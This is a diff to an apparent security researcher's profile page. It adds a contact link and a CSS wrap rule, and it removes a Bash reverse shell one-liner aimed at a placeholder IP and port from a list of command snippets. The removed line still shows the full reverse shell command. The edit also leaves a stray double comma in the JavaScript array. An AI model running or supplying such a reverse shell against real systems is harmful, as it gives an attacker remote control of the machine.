@@ -57,6 +57,7 @@
             display: flex;
             justify-content: center;
             gap: 1rem;
+            flex-wrap: wrap;
         }
 
         .profile-links a {
@@ -148,6 +149,7 @@
         <div class="profile-links">
             <a href="https://hackerone.com/vertrauensstellung" target="_blank" rel="noopener noreferrer">HackerOne</a>
             <a href="https://app.intigriti.com/researcher/profile/vertrauensstellung" target="_blank" rel="noopener noreferrer">Intigriti</a>
+            <a href="mailto:info@vertrauensstellung.de">Contact</a>
         </div>
     </header>
 
@@ -166,11 +168,7 @@
             { 
                 title: "Python HTTP Server", 
                 code: "python3 -m http.server 8000" 
-            },
-            { 
-                title: "Bash Reverse Shell", 
-                code: "bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'" 
-            },
+            },,
             { 
                 title: "Extract IPs from a file", 
                 code: "grep -oE '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' access.log" 
